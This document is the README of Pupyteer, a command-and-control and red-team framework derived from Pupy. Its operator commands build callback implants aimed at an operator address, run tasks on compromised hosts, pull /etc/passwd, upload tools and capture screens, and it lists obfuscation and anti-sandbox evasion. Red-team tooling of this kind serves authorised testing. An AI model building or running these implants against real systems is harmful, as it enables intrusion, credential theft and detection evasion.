# ╔══════════════════════════════════════════════════════════╗
# ║                    PUPYTEER                               ║
# ║          Red Team Operations Framework                   ║
# ╚══════════════════════════════════════════════════════════╝

> **Pupyteer** is a modular, operator-focused C2 and adversary-emulation framework built for authorized security assessments and red-team engagements.

Built as a modernization of the Pupy framework, Pupyteer prioritizes **modularity, reliability, controlled deployment, and detection resilience**. All components follow clear interface boundaries, enabling extensibility without coupling.

---

## ⚡ Quick Start

### From Source (Recommended for Development)

```bash
git clone https://github.com/yourorg/pupyteer
cd pupyteer

python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
pip install -e .
```

### Run the console

```bash
pupyteer                 # interactive TUI (starts the server and console together)
pupyteer --headless      # server only, no console
pupyteer -c ./pupyteer.yaml
pupyteer --debug
```

`pupyteer` is the single installed entry point (`pupyteer.main:main`).

The console asks for a credential before it opens any listener. The first run,
with an empty credential file, generates one admin password, prints it once, and
tells you to add your own with `operator add` — the same shape as the enrollment
secret. `login` / `logout` / `whoami` work from the prompt, and a token that
expires mid-session asks you back in without stopping the engine or dropping the
sessions that are live.

### Generate a Payload

Either from the console:

```
pupyteer > payloads build --name test-payload --platform linux --arch x64 \
             --type script --transport tcp --host 192.168.100.100 --port 8443 \
             --profile HTTPS-Standard --sleep 30 --jitter 25
```

`--type script` is the portable path: it emits a standalone `.py` agent that runs
on the target with nothing but a Python interpreter.

`--type executable` runs PyInstaller or Nuitka as a real subprocess. Both freeze
an binary for the machine that builds it, so:

- the tool has to be installed on the team server (`pip install pyinstaller`), and
- `--platform` has to match the team server's own OS — you cannot produce a Linux
  ELF from a Windows host, or the reverse.

Either way the build fails and says so rather than handing back a file with an
executable's name and none of its contents.

`--sleep` / `--jitter` set the beacon interval compiled into the payload.
`--persistence` is **off by default**: the agent only installs a registry /
crontab entry when you ask for it explicitly. `--screenshot` is likewise opt-in;
a payload built without it answers a capture request with `unknown action`.

To use HTTP callbacks instead, enable the listener in the server config and
build with `--transport http`:

```yaml
server:
  host: "0.0.0.0"
  port: 8443        # TCP callbacks
  http_port: 8080   # HTTP callbacks; 0 disables them
  http_uri: "/index.html"
  tls: true         # on by default; serve both listeners over TLS, payloads pin the certificate
  agent_auth: true  # require payloads to present this server's enrollment secret
  agent_auth_file: "./data/keys/enrollment.key"  # that secret's file, newest secret first
```

`tls` is on unless a config turns it off: the listener generates a self-signed
pair at `server.tls_cert` / `server.tls_key` on its first start and compiles that
certificate into every payload built afterwards, so the agent trusts one
certificate and nothing else. The value is read when the listener binds, so
changing it takes a restart. Set `tls: false` only when you have a reason to put
commands and results on the wire in plaintext, and think before flipping it on a
server that has already fielded payloads — the key pair belongs to the payloads
built against it, so replacing or moving it strands every one of them.

`agent_auth` (on by default) is the other half: TLS proves the listener to the
agent, the enrollment secret proves the payload to the listener. It is not
encryption — confidentiality on the wire comes from TLS alone — and it is not
per-agent credentials: the server generates one secret and compiles it into
every payload it builds, so it identifies this team server and not the host
carrying it. A `register` without it is refused before a session is created, so
finding the open port is no longer enough to get a handler. `agent_auth: false`
is the opt-out, and it is an explicit one: with it off the listener trusts
whoever reaches the port, which is fine on a loopback lab interface and not fine
anywhere else. The banner and a startup warning say when it is off.

On first start the server writes that secret to `server.agent_auth_file`
(`./data/keys/enrollment.key`, mode `0600`), and nothing else holds it — not
the config, not the audit log, never the terminal. The file is a list, newest
first: the first line is what `payloads build` compiles, the lines under it are
retired secrets still accepted so everything already deployed keeps its place, a
`#` line labels the secret below it, and deleting a line is the decision that
closes that door. The listener re-reads the file when a payload arrives rather
than when it starts, so a deletion lands without a restart — and a restart would
drop every session you are working at the moment you noticed. The console manages
the list and names every line by its fingerprint:

```
pupyteer > enrollment show                    # accepted secrets and their role
pupyteer > enrollment rotate                  # new secret current, old one retired
pupyteer > enrollment revoke <fingerprint>    # close one retired door
```

That secret is spent the moment the session exists, so the third proof is on the
wire rather than in a config file: `register` answers with a token for that
session alone, and every `checkin` and `output` has to carry it. Nothing about it
is configurable — there is no off switch, because a session nobody handed a proof
to must not be the kind anyone can command — and it never appears in `sessions
list`, in `sessions info` or in the audit log, only in `beacons_refused`.

Two things here get missed often enough to be worth saying plainly. Revoking an
enrollment secret does not stop a session that is already established — it only
turns the next registration away — so cutting off a live handler is `sessions
kill <id>`. And a listener whose enrollment file has gone missing admits nobody
rather than minting a replacement while payloads knock: a fresh secret would look
like a server that works while turning everything you deployed into a stranger.
`enrollment show` says so when the file holds nothing; restore it, or delete it
and restart to start a new boundary and rebuild the payloads.

`--transport https` works with `tls: true`, or with `server.https_cert` /
`server.https_key` for a certificate you obtained yourself, or against a reverse
proxy holding a real one.

Or programmatically:

```python
import asyncio
from pupyteer.server.core.engine import PupyteerEngine
from pupyteer.payloads.manager import PayloadConfig, PayloadType

async def main():
    engine = PupyteerEngine()
    await engine.start()
    config = PayloadConfig(
        name="test-payload",
        payload_type=PayloadType.SCRIPT,
        transport="tcp",
        host="192.168.100.100",
        port=8443,
        profile="HTTPS-Standard",
        sleep=30,
        jitter=25,
    )
    metadata = await engine.payloads.build(config)
    print(f"Artifact: {metadata.artifact_path} ({metadata.size_bytes} bytes)")
    print(f"SHA256: {metadata.hash_sha256}")
    await engine.stop()

asyncio.run(main())
```

### Prove the Callback Loop Before a Payload Has To

```bash
python -m pupyteer.tools.callback_test                    # shipped defaults
python -m pupyteer.tools.callback_test --config ./pupyteer.yaml
```

Starts a listener on a free loopback port, **generates an agent through the same
template `payloads build` renders**, runs it as a real subprocess, and checks the
three things that decide whether an engagement can start: a session appears, a
command runs on the host, and its output comes back. TLS and the enrollment
secret are read from the listener that is actually running rather than assumed by
a second implementation, so a PASS means a payload built from this config can
beacon against it — and the certificate, secret and audit trail of the test
server all land in a scratch directory, so a run leaves nothing on the team
server.

A `RESULT: FAIL` names the step that never happened and what the agent said about
it. An agent that exits with `listener rejected our enrollment secret` came from a
different server, or from a secret since revoked, and the fix is a rebuild rather
than a retry. Any refusals the listener counted on the way are reported too, with
the same names `transports list` uses.

### Work a Session

Run the generated artifact on the target host; it registers over the listener
and beacons. Then, from the console:

```
pupyteer > sessions list                       # callbacks
pupyteer > sessions interact <session_id>      # shell: sysinfo, ps, fs_list /etc, id -u
pupyteer > sessions results <session_id>       # output of commands already answered
pupyteer > sessions download <session_id> /etc/passwd ./passwd
pupyteer > sessions upload <session_id> ./tool /tmp/tool
pupyteer > sessions screenshot <session_id> ./screen.png   # needs --screenshot
```

Commands are queued per session and delivered on the agent's next check-in, so
output appears after up to one beacon interval. Inside `sessions interact` the
shell waits and prints the reply; if you leave early, `sessions results` catches
up. Transfers are chunked, so a file larger than the operator's memory is not a
problem.

`sessions screenshot` captures the whole screen using whatever the host already
provides — PowerShell's `System.Drawing` on Windows, `screencapture` on macOS,
and the first available of `gnome-screenshot`/`scrot`/`spectacle`/
`xfce4-screenshooter`/`import`/`grim` on Linux — so the agent pulls in no imaging
library. The image is returned over the session and deleted from the target's
temp directory; there is no third-party dependency to ship.

The module library reaches the same implant through the same command channel, so
`use <module>`, `set <OPTION> <value>` and `sessions route <session_id> <module>`
run it against a live session — `file_list`, `download`, `upload` and `discovery`
dispatch `fs_list`/`fs_get`/`fs_put`/`exec` tasks, and `ping`, `privesc`,
`screenshot` and `migrate` wrap the structured actions the agent already answers,
returning parsed results you can run as background jobs or across every session.
A module that cannot reach an agent returns an error naming that fact
rather than an empty success, a transfer that fails part-way reports how many
bytes did arrive, and a session that will not accept a command at all is reported
that way immediately instead of after the full wait — a gone implant is not a slow
one, and the difference decides whether you wait or move on. An action the payload
was not built to carry (say `screenshot` without `--screenshot`) is refused with
that reason, never answered with a result the target did not produce.

---

## 🏗️ Architecture

```
PUPYTEER
  ├── Server (C2 Engine)
  │   ├── Session Manager      — agent lifecycle, tagging, interaction
  │   ├── Task Queue           — async priority task scheduling
  │   ├── Profile Manager      — malleable C2 profiles (YAML)
  │   ├── Transport Manager    — TCP + HTTP/HTTPS listeners (see Transports)
  │   ├── Module Registry      — pluggable modules with ABC interface
  │   ├── Payload Manager      — build, versioning, artifact lifecycle
  │   ├── Evasion Engine       — obfuscation + Litterbox analysis
  │   ├── Auth Layer           — console login, hashed credential file, tokens
  │   ├── Audit Logger         — structured JSON with redaction
  │   └── RBAC                 — VIEWER/OPERATOR/ADMIN/SYSTEM, default-deny verb table
  │
  ├── Agent (Stub)
  │   ├── Core agent loop
  │   ├── Transport clients
  │   ├── Server-dispatched modules (see server/modules)
  │   └── Sleep masking
  │
  └── TUI
      ├── Startup banner & status bar
      ├── Session dashboard
      ├── Payload & evasion commands
      └── Command history & autocomplete
```

---

## 📋 Features

| Category | Capabilities |
|----------|-------------|
| **Payloads** | Python script, PE executable, versioning, metadata tracking, signing stub |
| **Transports** | Served listeners: **TCP** and **HTTP/HTTPS** (same session protocol, one JSON message per POST). Agent-side DNS/DoH/WebSocket stubs exist but have no listener, so `payloads build` rejects them rather than ship a payload that can never call back. |
| **C2 Profiles** | YAML-based malleable C2 — heartbeat, encoding, timeouts, headers, URIs |
| **Modules** | Core, Recon, Execution, File Ops, Red-Team, Evasion — standardized ABC, dispatched to the implant over the session command channel |
| **Sessions** | list/info/interact/rename/kill/tag/search/route, chunked file upload & download, screen capture, audit trail |
| **Tasks** | Priority queue (CRITICAL → BACKGROUND), async execution, tracking |
| **Evasion** | XOR/AES/RC4 obfuscation, PE manipulation, anti-sandbox/debug/VM, Litterbox integration |
| **Security** | console login with roles and a default-deny verb table, enrollment secret shared by every payload this server builds, with rotation and revocation from the console, audit trail with redaction, input validation, TLS on callbacks by default (see Security for what is not wired) |
| **Audit** | JSON-structured logs, operator attribution bound to the sign-in, redaction, rotation, query API |
| **TUI** | ASCII banner, themes, autocomplete, history, resize handling, dashboard, login and re-auth in place |

---

## 📂 Project Structure

```
pupyteer/
├── server/
│   ├── core/          # engine, config, auth, audit, logging, errors, queue, c2, rbac, validation
│   ├── sessions/      # session lifecycle, tagging, interaction
│   ├── tasks/         # task manager
│   ├── transports/    # Transport ABC + concrete implementations + listener
│   ├── profiles/      # malleable C2 profile parser/validator/manager + CS converter
│   ├── modules/       # registry, executor, builtin modules (recon, evasion)
│   └── evasion/       # obfuscator, litterbox client, test runner, models
│
├── agent/
│   └── core/          # agent loop, auth, stub generator, sleep masking
│
├── payloads/          # payload builder, signer, store, artifact lifecycle
│
├── tui/
│   ├── app.py         # console application, command registry, completer
│   ├── themes.py      # dark/light theme definitions
│   ├── screens/       # (reserved)
│   ├── widgets/       # (reserved)
│   └── commands/      # sessions, jobs, payloads, evasion, pipeline, msf_core
│
├── config/
│   ├── defaults/      # pupyteer.yaml template
│   └── profiles/      # C2 profile definitions
│
├── tests/
│   ├── unit/          # unit tests
│   ├── integration/   # integration tests
│   └── regression/    # regression tests
│
├── tools/             # callback self-test (generated agent against a real listener)
│
└── docs/              # operator manual, developer docs, profile & module guides,
                       # security notes, installation guide
```

Generated artifacts land in `./payloads/artifacts` and logs in `./logs` — both
git-ignored.

---

## 🧪 Testing

```bash
# All tests
.venv/bin/python -m pytest pupyteer/tests/ -v

# Unit only
.venv/bin/python -m pytest pupyteer/tests/unit/ -v

# Integration only
.venv/bin/python -m pytest pupyteer/tests/integration/ -v
```

**Current test count: 925 tests passing** (`pytest pupyteer/tests`)

The suite runs against real engines and real listeners, and repoints every file a
default-config server writes — the audit trail, the enrollment secret, the TLS
pair, the credential file — into a temp directory. A session fixture fails the run
if `logs/audit.json` in the checkout grows, because a test that writes to an
operator's real audit trail is also a test that can log in with a credential left
there for a human to find.

`tools/callback_test` is under test as well, including a case that breaks the
listener on purpose: a self-test that drifts from the protocol reports PASS
against a server that would refuse every payload built for it, which is worse than
no self-test at all.

---

## 🔒 Security

**Read this section before using Pupyteer against anything.** A C2 framework that
overstates its own protections is worse than one with fewer features, so this
section describes what the running code does, not what its modules could do.

### What works today

- **Audit logging** — operator actions recorded with attribution, in
  `audit.log_file` (`./logs/audit.json` by default), rotated at `audit.max_bytes`
  or daily and kept for `audit.backup_count`
- **Credential redaction** — secrets are kept out of audit logs
- **Input validation** — operator inputs checked before execution
- **Transport TLS with certificate pinning** — on by default (`server.tls`), so
  both listeners serve TLS from a generated self-signed pair
  (`server.tls_cert`/`server.tls_key`). Payloads built while it is on compile that
  certificate in and trust *only* it: signature verification stays on, so a
  man-in-the-middle without your certificate is rejected, and you never need a CA
  certificate for a bare team-server IP. `--transport https` reaches the same
  listener over `https://`. A certificate already in use is never replaced under
  those paths — regenerating it would strand every payload in the field. Because
  the failure mode of an encrypted listener is silence, a payload that cannot
  complete the handshake is not ignored: every one of them counts toward
  `handshakes_refused` in `transports list`, and the audit log records
  `handshake_refused` with the peer and the reason — at most one line a minute
  per peer, so a port sweep cannot use it to bury the rest of a log that rotates.
  Both payload languages implement it: the Python agent wraps its socket in the
  pinned context, and the C template drives Schannel and compares the peer
  certificate's SHA-256 by hand, so a `.exe` built for one listener stops with
  exit 3 rather than knocking at another for the rest of its life. A PE build
  with TLS on and no certificate resolved to pin is refused at build time.
  A build made while TLS is off says so in its build log.
- **Authenticated agent enrollment** — with `server.agent_auth` on (the default)
  the server keeps its generated secrets at `server.agent_auth_file`; a `register`
  that does not present one of them is refused *before* any session exists, counted
  in the listener stats and written to the audit log as `registration_rejected`.
  Payloads built by this server compile the current one into their `register`
  message, and an agent whose enrollment is refused exits instead of beaconing
  against a server that will never admit it. Both listeners apply the same check,
  and `transports list` reports them as separate rows — a rejection count belongs to
  the port that was probed, not to whichever listener you happened to start first.
- **Enrollment rotation and revocation** — because that file is a list rather than
  one string, recovering a payload no longer costs the whole boundary at once.
  `enrollment rotate` makes a new secret current and retires the previous one *in
  place*: it stays in the file and is still admitted, so the rotation itself
  orphans nothing already deployed, and both fingerprints are reported so you can
  say which is which when the separate decision to close it comes. The file keeps
  at most eight retired secrets; a rotation that would carry more drops the oldest
  and logs that payloads built with them can no longer enrol. Only a retired line
  is revocable — `enrollment revoke` refuses the current fingerprint, because that
  is what `payloads build` is compiling as you type and deleting it would quietly
  promote a retired secret into the job; rotate first. Nothing but fingerprints
  reaches an operator or the audit trail: `enrollment show` prints a
  fingerprint/role table whose retired rows carry the UTC stamp of the rotation
  that retired them, and `enrollment_rotated` / `enrollment_revoked` log
  fingerprints only. Reading the boundary needs `config:read`, turning it over
  needs `config:write`, which is `admin`. Revocation stops the next registration,
  not the session in front of it — that one proves itself with its beacon token,
  and `sessions kill <id>` is the verb that ends it.
- **Beacons prove their own session** — `register` hands the agent a random token
  for that session alone, and every later `checkin` or `output` has to present it.
  The enrollment secret is spent the moment a session exists, and a session id only
  *names* one: twelve hex characters that are printed when an agent joins, listed by
  `sessions list` and written to the audit trail. Without the second proof, whoever
  has one could drain that session's queued commands (your tasking, often including
  where you go next) and answer them with text of their own, which you would read as
  something a target said. The token never reaches `sessions list`/`info`/`search`
  or the audit log; refusals count toward `beacons_refused` in `transports list` and
  leave one `beacon_refused` line per peer and session per minute. A payload built
  before this still registers and is then refused on every beacon, so it never runs
  a command and re-registers instead — `beacons_refused` climbing while nothing
  arrives is that payload, and it needs rebuilding from this server.
- **Implants declare what they can be asked to do** — `register` carries
  `capabilities` and `max_line` as well as the hostname, and the command queue holds
  the session to that list. It exists because the two agents are not the same size:
  the Python stub has handlers for transfer, recon, privilege checks and screens, and
  the Windows `.exe` is a few thousand lines of C whose command execution meant
  `cmd.exe /c "<the string>"`. A structured tasking no implant can perform used to go
  down the queue anyway and come back as whatever a shell said about a word it had
  never seen — and an operator reading `screenshot is not recognized as an internal
  or external command` believes the *target* said it. That is the thing being fixed:
  not a refusal for its own sake but a wrong answer that is actionable, that decides
  the next tasking and lands in a report attributed to a host that ran nothing. A
  refused command never leaves the server: it completes in the queue with a refusal
  that names the implant's own claim and says nothing ran, `sessions info` prints that
  claim (or says `none declared — shell commands only`), and
  `session_command_unsupported` goes to the audit trail. Two rules keep it usable.
  Shell text is always allowed, because handing a string to a command interpreter is
  the one thing both agents genuinely agree on, and the payloads already in the field
  predate the fields: they declare nothing and are trusted with shell and nothing
  structured, which is a thing to say out loud rather than discover through base64
  that never arrives. `max_line` is the same conversation on the transfer side — the
  implant reads with a buffer of its own, so a chunk is sized to something that
  survives the trip instead of being dropped at the socket, which is how a download
  comes back short with a check mark next to it. The other half of the promise is
  kept in the payloads: the Windows `.exe` now answers the verbs it announces —
  `ping`, `sysinfo`, `processes`, `fs_list`, `exit` — instead of handing them to
  cmd.exe, and the Python stub knows every word the server's verb table lets
  through, which a test checks by parsing the table rather than by trusting it.
- **Verification gates** — `scripts/verify_secure_defaults.py --strict` and
  `scripts/audit_deps.py` both exit non-zero on findings
- **Operator login and role gate** — the console will not start the engine until a
  credential is accepted, and every verb is checked against that sign-in at
  dispatch. Credentials live in their own file (`security.operators_file`, mode
  `0600`, salted `scrypt` hashes with the parameters stored per entry), never in
  the config; the shipped `changeme` is gone from both, and
  `verify_secure_defaults.py --strict` fails if a plaintext credential comes back.
  Roles are `viewer` / `operator` / `admin`, resolved from a complete default-deny
  table: a verb nobody wrote down resolves to `unclassified` and is refused rather
  than becoming an open door, and a test fails if a registered verb is missing from
  the table or touches a target while public. Authority follows the **token**, not
  the name — the permission set is frozen at login, so rewriting `operator.name`
  renames nothing that authorises (the console refuses that key and
  `security.*` outright, and audits the attempt). A wrong name and a wrong
  password cost the same time to an observer, and failed logins lock an account out
  for `security.lockout_seconds`, which then decays rather than needing a restart.

### What does not work yet

- **Enrollment is one shared secret, not per-agent credentials.** Every payload
  this server builds carries the same string, so it identifies the team server,
  not the host: whoever recovers a dropped binary can enroll sessions as if they
  were you, and so can whoever reads `data/keys/enrollment.key` — which holds every
  secret still accepted, not just the current one. What they cannot do with it is
  speak for a session that is already there — that needs the token that
  registration handed to that one payload. Rotation is the answer for the
  boundary, not for an individual agent: there is still no re-keying channel, so a
  deployed payload keeps the secret it was built with and cannot be handed a new
  one. Revoking that secret turns it away from its next registration onwards, while
  the session it already has runs on its own token until it dies or you kill it.
  `server.agent_auth: false` removes the check entirely.
- **Login gates the console, not the network.** Whoever can reach a listener
  still only gets what TLS, enrollment (`server.agent_auth`) and the session's own
  beacon token allow, and `--headless` runs the server with no console to sign in
  to at all. There is no per-operator authorisation of what reaches a session —
  the check happens before the console dispatches a verb, and nowhere else. The
  agent-side JWT/challenge-response module that used to sit unused in
  `agent/core/auth.py` has been deleted rather than left to look like a
  capability. Signing in is
  also not what protects the keyboard: anyone who can read the terminal while a
  token is live, or who can write `data/keys/operators.json`, is operator. And an
  `admin` can move `audit.log_file` in the config or delete the file — attribution
  says who the console blames, it is not tamper-proofing against the person it
  blames.
- **There is no payload-level cipher.** `StubConfig.obfuscation_key` keys the
  string-table XOR used to obfuscate the script; it is not, and never was, an
  encryption layer for the channel. Confidentiality comes from TLS only.
- **A capability claim is the payload's own word, not a verified fact.** Nothing
  checks it against the binary, because a session is created from its `register`
  message and carries no payload id to look a claim up on. So the gate is about
  reporting and not about authority: an implant that overstates what it carries
  still gets the tasking queued and can answer it with whatever it likes, exactly
  as it could before this existed. What it cannot do now is fail in the one
  direction that fooled an operator — claiming nothing about a verb and having a
  shell invent the answer. Adding a verb to the agent therefore means adding it to
  `KNOWN_CAPABILITIES` as well; a name outside that vocabulary is ignored at
  registration rather than stored, which also means a payload cannot grant itself
  a permission by inventing a word for it.

Treat network-level access control on the team server as part of the deployment.

---

## ⚠️ Legal & Ethical Notice

This framework is intended **exclusively for authorized security testing and adversary emulation**. Unauthorized use against systems without explicit written permission is illegal and unethical.

---

## 📜 License

BSD 3-Clause — See [LICENSE](LICENSE) for details. Pupyteer is derived from
Pupy (Copyright © 2015 Nicolas VERDIER) and retains that notice. No third-party
source is vendored; dependencies are pip-installed per `requirements.txt`.

---

**Built for authorized red-team operations. Test responsibly.**
